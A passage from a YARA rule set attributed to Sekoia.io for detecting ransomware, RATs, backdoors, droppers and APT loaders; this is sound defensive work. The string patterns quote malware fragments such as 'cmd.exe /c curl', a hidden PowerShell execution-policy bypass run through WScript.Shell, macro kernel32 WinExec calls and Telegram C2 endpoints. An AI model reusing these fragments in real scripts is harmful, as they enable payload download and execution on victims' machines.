		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/rat_win_romcom_payload.yar#L4-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "56f016df8e9165522e18f34bdb7c3044ee8927f53dd6818fa2b3d6424191d8e0"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "160ed1cdf6e9321cef19cfed6a63b4b5557dd35e174b821bf8a81c4146fa6536" )
}

rule SEKOIA_Ransomware_Win_Blackmatter
{
	meta:
		description = "Detect Black matter ransomware (2021-07-23)"
		author = "Sekoia.io"
		id = "9b2d8ac3-b4d1-40f5-ac57-411547dcb2cf"
		date = "2021-08-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/ransomware_win_blackmatter.yar#L4-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5a407a9901314211e13bef30254f1d129cf3c731ea970abff8602f1ae40177cb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "5e89d335de2021a2c268acf00ec513e5" )
}

rule SEKOIA_Hafnium_Tarrask_Malware
{
	meta:
		description = "Hunting rule to look for Tarrask malware"
		author = "Sekoia.io"
		id = "6f1728d6-dc9b-4ea7-8656-2b069ee269a0"
		date = "2022-04-14"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/hafnium_tarrask_malware.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "f9309707d25cfe6bccf050f24e14c42b53f3d017916a02eaada74c4782efdd5c"
		score = 50
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "delete sd success" wide ascii nocase
		$s2 = "Task successfully registered." wide ascii nocase

	condition:
		all of them
}

rule SEKOIA_Loader_Win_Operationmagalenha_Vbs
{
	meta:
		description = "Finds VBS file loading the PeepingTitle backdoor"
		author = "Sekoia.io"
		id = "b1f705d1-de3e-4ce6-9bb7-0e39b6e79add"
		date = "2023-05-31"
		modified = "2024-12-19"
		reference = "https://www.sentinelone.com/labs/operation-magalenha-long-running-campaign-pursues-portuguese-credentials-and-pii/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_operationmagalenha_vbs.yar#L1-L39"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "bb1c48ea6a4d9f0bc04df558837f2d448b38eac920cb4030e01b915a4e442708"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str01 = "'Skip to content" ascii
		$str02 = "'Search" ascii
		$str03 = "'Sign in" ascii
		$str04 = "'Sign up" ascii
		$str05 = "'Code" ascii
		$str06 = "'Terms" ascii
		$str07 = "'Privacy" ascii
		$str08 = "'Security" ascii
		$str09 = "'Status" ascii
		$str10 = "'Docs" ascii
		$str11 = "'Contact GitHub" ascii
		$str12 = "'Pricing" ascii
		$str13 = "'API" ascii
		$str14 = "'Training" ascii
		$str15 = "'Blog" ascii
		$str16 = "'About" ascii
		$vbs01 = "WScript.Sleep" ascii nocase
		$vbs02 = "Set obj" ascii nocase
		$vbs03 = "Dim obj" ascii nocase
		$vbs04 = "https://tinyurl.com" ascii nocase
		$vbs05 = "C:\\Users\\Public" ascii nocase
		$vbs06 = "CreateObject(\"WScript.Shell\")" ascii nocase
		$vbs07 = ".SaveToFile" ascii nocase

	condition:
		10 of ( $str* ) and 5 of ( $vbs* )
}

rule SEKOIA_Vpn_Mul_Softether
{
	meta:
		description = "Detect the open-source SoftEther VPN"
		author = "Sekoia.io"
		id = "a1fbf4fe-b934-4a66-b6b1-ebe2f83505cd"
		date = "2024-04-15"
		modified = "2024-12-19"
		reference = "https://www.softether.org/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/vpn_mul_softether.yar#L1-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "f93e838631518590e518f29557c60a40734da30b62c056f8ebb8febed389551b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\softether_se%s"
		$ = "GET /vgc_download_dat/ HTTP/1.1"
		$ = "http://x%c.x%c.client.api.vpngate2.jp/api/"
		$ = "http://x0.x0.client.api.vpngate2.jp/check/check.txt"
		$ = "https://x%c.x%c.statistics.api.vpngate2.jp/api/statistics/"
		$ = "Software\\SoftEther Project\\SoftEther VPN\\"
		$ = "|vpnsetup_nosign.exe" wide
		$ = "/ISEASYINSTALLER:%u" wide
		$ = "/CALLERSFXPATH:\"%s\"" wide
		$ = "vpn_client.config" wide
		$ = "vpn_bridge.config" wide
		$ = "|backup_dir_readme.txt" wide
		$ = "vpn_debuginfo_%04u%02u%02u_%02u%02u%02u.zip" wide

	condition:
		8 of them
}

rule SEKOIA_Apt_Cloudatlas_Powertunnel_Loader
{
	meta:
		description = "Detects the Powershell loader of the PowerTunnel dll"
		author = "Sekoia.io"
		id = "f2333b8a-99e9-4f28-b0d8-4f7dc4c648c5"
		date = "2022-11-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_cloudatlas_powertunnel_loader.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "742374ad22d9333ef071fe95058f28ae00325cca833b557481ef5d453b3a4977"
		score = 75
		quality = 55
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "New-Object System.IO.Compression.GzipStream(" ascii fullword
		$ = "[System.Reflection.Assembly]::Load("
		$ = ".ReadBytes("
		$ = ".Service]::StartMain"

	condition:
		uint8be( 0 ) == 0x24 and all of them
}

rule SEKOIA_Backdoor_Win_Warhawk
{
	meta:
		description = "Detect the WarHawk backdoor used by the SideWinder intrusion-set"
		author = "Sekoia.io"
		id = "d0ec19a7-cb08-4bca-b153-d7b0358186b4"
		date = "2022-10-24"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/warhawk-new-backdoor-arsenal-sidewinder-apt-group-0"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_warhawk.yar#L1-L56"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "09cd60f91c54da6ca051550c89629d11a55a89d5b0d5f6d5696232b4edfdd491"
		score = 75
		quality = 58
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash_exe1 = "7d3574c62df44b74337fc74ec7877792b4ffa1486a49bb19668433c3ca8836b5"
		hash_exe2 = "624c6b56ee3865f4a5792ad1946a8e86b876440a5af3bac22ac1dee92f1b7372"
		hash_iso1 = "58b3686e4255d32dbcf7dee9dac1d5be6d4692d086cde167da1e1a5e0e1b315a"
		hash_iso2 = "f97d5d3e1c2ceb3e9d23ae5b5d4e7c9857155df5acf7f67fee995cb041c797dc"

	strings:
		$ = {7b205c226e616d655c223a205c2225735c222c205c2273697a655c223a205c225c222c205c226d6f645c223a205c2225735c222c205c22747970655c223a205c2246696c6520666f6c6465725c22207d2c}
		$ = {7b20225f68776964223a20222573222c20225f636f6d7075746572223a20222573222c20225f757365726e616d65223a20222573222c20225f6f73223a2022257322207d}
		$ = {7b5c226e616d655c223a205c2225735c222c205c22747970655c223a205c2225735c227d2c}
		$ = {7b20225f68776964223a20222573222c20225f66696c656d67725f646f6e65223a202274727565222c20225f726573706f6e7365223a2022257322207d}
		$ = {7b20225f68776964223a20222573222c20225f7461736b223a20227472756522207d}
		$ = {7b20225f68776964223a20222573222c20225f7461736b5f646f6e65223a202274727565222c20225f6964223a2022257322207d}
		$ = {7b20225f68776964223a20222573222c20225f636d64223a20227472756522207d}
		$ = {7b20225f68776964223a20222573222c20225f636d645f646f6e65223a202274727565222c20225f726573706f6e7365223a2022257322207d}
		$ = {7b20225f68776964223a20222573222c20225f66696c656d6772223a20227472756522207d}
		$ = {7b20225f68776964223a2022257322207d}
		$ = {7b20225f68776964223a20222573222c20225f70696e67223a20227472756522207d}
		$ = "cmd.exe"

	condition:
		all of them
}

rule SEKOIA_Backdoor_Win_Ketrum2
{
	meta:
		description = "Detect Ke3chang's Ketrum backdoor version 2"
		author = "Sekoia.io"
		id = "afcc349a-d44b-4b66-b86f-c62e700fa899"
		date = "2022-10-19"
		modified = "2024-12-19"
		reference = "https://www.intezer.com/blog/research/the-evolution-of-apt15s-codebase-2020/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_ketrum2.yar#L4-L35"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5317b133337ad333c97bbfa6c9d62aea5fd81f3b570f1d6b1ac93ea82062ef61"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "271384a078f2a2f58e14d7703febae8a28c6e2d7ddb00a3c8d3eead4ea87a0c0"
		hash2 = "aa467945dd7b9b095e592fc96384bb385f2c95d00d5424e42bb6ab09827cb0ce"
		hash3 = "aacaf0d4729dd6fda2e452be763d209f92d107ecf24d8a341947c545de9b7311"
		hash4 = "ac5cb6e17f094068686225075251153e3eb21dc2d1ae744a97ab113cab034a36"

	strings:
		$ = "powershell.exe" wide
		$ = "cmd.exe" wide
		$ = "%s\\adult.sft" wide
		$ = "%s\\Notice" wide
		$ = "%s\\Message" wide
		$ = "\\Microsoft\\Media Player" wide
		$ = "Windows\\CurrentVersion\\Explorer\\Shell Folders" wide ascii
		$ = "Windows\\CurrentVersion\\Internet Settings" wide ascii

	condition:
		all of them and for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "49a60be4b95b6d30da355a0c124af82b35000bce8f24f957d1c09ead47544a1e" )
}

rule SEKOIA_Clipper_Win_Atlas_Strings
{
	meta:
		description = "Detects Atlas Clipper"
		author = "Sekoia.io"
		id = "f08c6af6-c325-4f7d-8686-575b25550d6a"
		date = "2023-07-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/clipper_win_atlas_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "c8ad062b69dfe996a488ee9c79f0e7e0016f57f5b54fc39aeb4e207d2a42aa75"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "C:/Users/box/Desktop/ATLAS/ATLAS/main.go" ascii
		$s2 = "ATLAS Clipper" ascii
		$s3 = "Victim: %s" ascii
		$s4 = "Attacker: %s" ascii
		$s5 = "Install Path: %s" ascii
		$s6 = "HWID: %s" ascii
		$s7 = "Install Date: %s" ascii
		$s8 = "https://t.me/atlasclipper_channel" ascii

	condition:
		all of them
}

rule SEKOIA_Spyware_And_Bahamut
{
	meta:
		description = "Detect Bahamut's spyware based on common information gathering function names"
		author = "Sekoia.io"
		id = "d416997e-baf1-412c-bf39-905a6e19b65e"
		date = "2022-11-23"
		modified = "2024-12-19"
		reference = "https://www.welivesecurity.com/2022/11/23/bahamut-cybermercenary-group-targets-android-users-fake-vpn-apps/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/spyware_and_bahamut.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5f44c938fed9b32eaf183be979a67e0c7fde409e72875359105ad7ffb393893d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "c51dc2132c830c560aaeae4bf48e5f0d28c84b36d27840b5c2ba170d87f4afa5"
		hash2 = "d7e2cf642b236dba9ba0cbe5a9dc28baf22477973d5ce163e21ec40f5f26e078"

	strings:
		$ = "FbDao"
		$ = "SignalDao"
		$ = "conionDao"

	condition:
		all of them
}

rule SEKOIA_Latrodectus_Br4_Js_Dropper
{
	meta:
		description = "Detect the JS script used to drop Latrodectus"
		author = "Sekoia.io"
		id = "042a598d-66fa-4994-a793-228355abd5dd"
		date = "2024-06-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/latrodectus_br4_js_dropper.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "a835bd9a9ad68fd2f285ec5c04a5c78ba5ca85381ff30048ac375bef220fd72f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = " installer.InstallProduct(msiPath);" ascii
		$s2 = "new ActiveXObject(\"WindowsInstaller.Installer\");" ascii

	condition:
		all of them
}

rule SEKOIA_Apt_Buhtrap_Maldocx
{
	meta:
		description = "Detect the malicious DOCX used by Buhtrap"
		author = "Sekoia.io"
		id = "4aaba2f1-fafd-4e3f-8b18-7beda11464d1"
		date = "2022-02-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_buhtrap_maldocx.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "69968fa6836a71cd835f40c5168d197d3b5fc13b62791279f48a6bdeb4709bd5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<xm:macrosheet xmlns=" ascii fullword
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"WriteFile"
		$ = "CALL(\"kernel32\",\"VirtualAlloc"
		$ = "CALL(\"kernel32\",\"WinExec"
		$ = "CALL(\"kernel32\",\"lstrcatA"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"ExpandEnvironmentStringsA"
		$ = "CALL(\"kernel32\",\"CloseHandle"

	condition:
		all of them
}

rule SEKOIA_Apt_Kimsuky_Sharptongue_C2_Source
{
	meta:
		description = "Detects the PHP code of the SharpTongue C2"
		author = "Sekoia.io"
		id = "a2ccf773-511c-4088-8bcf-b923291d024b"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_kimsuky_sharptongue_c2_source.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "c301a99876cfe2863546c990654aa922f9327e0eb010968eaea43f1d8ced76da"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<?php"
		$ = "foreach($_GET as $variable => $value)"
		$ = "$chk=$value"
		$ = "base64_encode($ip)"

	condition:
		all of them
}

rule SEKOIA_Rat_Win_Atharvan
{
	meta:
		description = "Detect Atharvan RAT"
		author = "Sekoia.io"
		id = "61347490-d281-4892-adba-89cf6187545f"
		date = "2023-02-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/rat_win_atharvan.yar#L1-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "fee9a5a684b3e9bd629a0e87bdf63ba0c1fc1e970ca3b7fec8d7a4f2f60a355a"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = {44 3a 5c 72 61 6e 67 5c 54 4f 4f 4c 5c 33 52 41 54}

	condition:
		all of them
}

rule SEKOIA_Backoor_Win_Gobear
{
	meta:
		description = "Detect the GoBear backdoor used by Kimsuky"
		author = "Sekoia.io"
		id = "f922bf1b-652e-4a2f-91e9-76ecd2e3bf6a"
		date = "2024-02-13"
		modified = "2024-12-19"
		reference = "https://medium.com/s2wblog/kimsuky-disguised-as-a-korean-company-signed-with-a-valid-certificate-to-distribute-troll-stealer-cfa5d54314e2"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backoor_win_gobear.yar#L4-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "8ca2699058ded62cbf4b78040985a4e5ebce0a1ff94034206c81a4c8e91f479b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "668031f53390dc749971888029911c12d4171534f77c17a962e698bf121d0e20" )
}

rule SEKOIA_Crypter_Vbs_To_Exe
{
	meta:
		description = "first stage of Crypter-VBS-to-EXE dropped on infected hosted"
		author = "Sekoia.io"
		id = "33ed286f-3055-452e-952b-abaf11a543a1"
		date = "2023-01-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/crypter_vbs_to_exe.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "4b3a411de3f36a7f9a310e1b789988c3d9d53eb195d04b374bdf1e5b4157b1e9"
		score = 75
		quality = 55
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$theDot = ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" ascii
		$s1 = "cmd.exe /c curl" ascii
		$s2 = "WScript.Sleep(3000)" ascii
		$s3 = "runCmd = \"cmd.exe /c powershell.exe -exec Bypass -C \" + myVar +" ascii
		$s4 = "WshShell.Run \"cmd /c \" & runCmd, 0, True" ascii

	condition:
		#theDot> 200 and all of ( $s* )
}

rule SEKOIA_Apt_Apt29_Wineloader_Malicious_Hta
{
	meta:
		description = "Detects malicious HTA used by APT29 to drop Wineloader"
		author = "Sekoia.io"
		id = "5a17d854-0564-4830-a0e5-7867b99716c2"
		date = "2024-03-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_apt29_wineloader_malicious_hta.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "efafcd00b9157b4146506bd381326f39"
		logic_hash = "0cc4692e5ff3f258c287f28030147f725d6a534c4f2f7a2a4ff49a305b7fd13d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID="
		$ = "var _0x"
		$ = "Date['\\x6e\\x6f\\x77']"

	condition:
		all of them
}

rule SEKOIA_Apt_Gamaredon_Gamaredon_Lnk_Usb_Spreader
{
	meta:
		description = "Detects Gamaredon LNK USB Spreader"
		author = "Sekoia.io"
		id = "a0972e30-bfc5-48ff-b04b-382db8c08a54"
		date = "2023-06-19"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_gamaredon_gamaredon_lnk_usb_spreader.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "2aee8bb2a953124803bc42e5c42935c92f87030b65448624f51183bf00dd1581"
		logic_hash = "3adb2433eda559d9b32316f4733741b0fc8c576937b1decede8bc7d23b203a0e"
		score = 75
		quality = 64
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = ".CREatesHoRTCUt(" nocase ascii wide
		$ = "cOPY-Item $enV:UsErprOfilE" nocase ascii wide
		$ = "-dEsTInaTioN $Env:" nocase ascii wide
		$ = " = GET-ChilDITem $drivE.nAMe" nocase ascii wide
		$ = "STArt-SLEeP" nocase ascii wide
		$ = "-eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy" nocase ascii wide
		$ = "drIvETYPe='2'" nocase ascii wide
		$ = ".iConloCaTiON = " nocase ascii wide

	condition:
		7 of them
}

rule SEKOIA_Storm_1811_Files_Dat
{
	meta:
		description = "Detects files used in a campaign performed by the intrusion set Storm-1811"
		author = "Sekoia.io"
		id = "8b14f276-0c39-422b-9b19-d96b139a7ae8"
		date = "2024-06-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/storm_1811_files_dat.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "d1d5b76671cefe8b876ca8df50205a04ebbcd973f115919b901f6a7946492904"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RuntimeBroker" ascii fullword
		$s2 = "InstallSpamFilters" ascii fullword
		$s3 = "newfile333.txt" ascii fullword
		$s4 = "Installing spam filter kb_outlook" ascii fullword
		$s5 = "s.zip" ascii fullword
		$s6 = "Update completed" ascii fullword
		$s7 = "Updates installed" ascii fullword
		$s8 = "update_log.tgz uploaded ok" ascii fullword
		$s9 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii fullword
		$s10 = "runtimebroker_connect" ascii fullword

	condition:
		5 of them
}

rule SEKOIA_Backdoor_Win_Mgbot_Main
{
	meta:
		description = "Detect MgBot main.dll file"
		author = "Sekoia.io"
		id = "528baa11-58d5-470a-bd6d-963d4ac75d97"
		date = "2024-03-20"
		modified = "2024-12-19"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_mgbot_main.yar#L4-L35"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "61b335c88ce8bc56396b597c7c6f27b1d431941682401f0b3950c80edf7d8403"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "706c9030c2fa5eb758fa2113df3a7e79257808b3e79e46869d1bf279ed488c36"
		hash2 = "017187a1b6d58c69d90d81055db031f1a7569a3b95743679b21e44ea82cfb6c7"

	condition:
		pe.imphash( ) == "8e1ee04a99c77bd54c6dc55214ffa2e3" or hash.md5 ( pe.rich_signature.clear_data ) == "67e8e8b75b981b5c8ff31149dc2c61b2" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "7c6adf9987e6dfbf19b5f156b0314798" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "46fa9f5a035c8ae8de1a0d14150bd5ef" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "f7895f9456f8d51125e6744960c38133" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "5d82bb8a7ef37c417615381b446f715c" ) or for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "d7808c6662f098e685040f7c61bc033d9e73002f674de7cf2ffcd6230d60d429" )
}

rule SEKOIA_Rat_Win_Ninerat
{
	meta:
		description = "Detect the NineRAT payload"
		author = "Sekoia.io"
		id = "a9f4f78b-5b86-4ac1-9b9b-ba2672b938bf"
		date = "2023-12-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/rat_win_ninerat.yar#L4-L31"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "bbb695444a6ec0d6049d0ce233ca37de6f78393e5ceb5d454867c8b554269684"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "47e017b40d418374c0889e4d22aa48633b1d41b16b61b1f2897a39112a435d30"
		hash2 = "82d4a0fef550af4f01a07041c16d851f262d859a3352475c62630e2c16a21def"

	strings:
		$ = "https://api.telegram.org/bot"
		$ = "/getMe"
		$ = "/upgrade"
		$ = "/getFile"
		$ = "/sendMessage"
		$ = ">> Request send time:"

	condition:
		all of them or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "3ce78c89e2c0e795ad3382aa12e99683" )
}

rule SEKOIA_Backdoor_Oyster
{
	meta:
		description = "Detects files related to the Oyster backdoor."
		author = "Sekoia.io"
		id = "f95f98ea-1e52-45ae-8abf-a986f95d4ab2"
		date = "2024-08-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_oyster.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "ffd84d0c7064bcd69121aa606bc642ff2b5c9927ba622260a02a9689c7ab8878"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "CleanUp30.dll" ascii fullword
		$s2 = "MSTeamsSetup_c_l_.exe" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Downloader_Win_Donot
{
	meta:
		description = "Detect the DoNot's downloader malware. There are big binaries in downloader strings."
		author = "Sekoia.io"
		id = "31b153cc-a4b9-40a0-8bcb-ce1370645b4b"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/downloader_win_donot.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "f6a03e6cfda74c1fbb1e8939a66735498d604a821b8b51492c2c5c6a46a38b6e"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "001100000011000100110001001100000011000000110000001100010011000100110000001100010011000100110000001100010011000100110000001100010011"
		$ = "01010011011011110110011001110100011101110110000101110010011001010101110001001101011010010110001101110010011011110111001101101111011001100111010001011100010101110110100101101110011001000110111101110111011100110101110001000011011101010111001001110010011001010110111001110100010101100110010101110010011100110110100101101111011011100101110001010101011011100110100101101110011100110111010001100001011011000110110000000000"
		$ = "0101110001110011011110010111001101110100011001010110110100110011001100100101110001110010011101010110111001100100011011000110110000110011001100100010111001100101011110000110010100000000"

	condition:
		1 of them
}

rule SEKOIA_Implant_Win_Quantum_Builder_Lnk
{
	meta:
		description = "Detect .LNK files created using Quantum Builder"
		author = "Sekoia.io"
		id = "65f8a426-8bf3-4f7f-b7d2-fd8da5b660f7"
		date = "2022-06-22"
		modified = "2024-12-19"
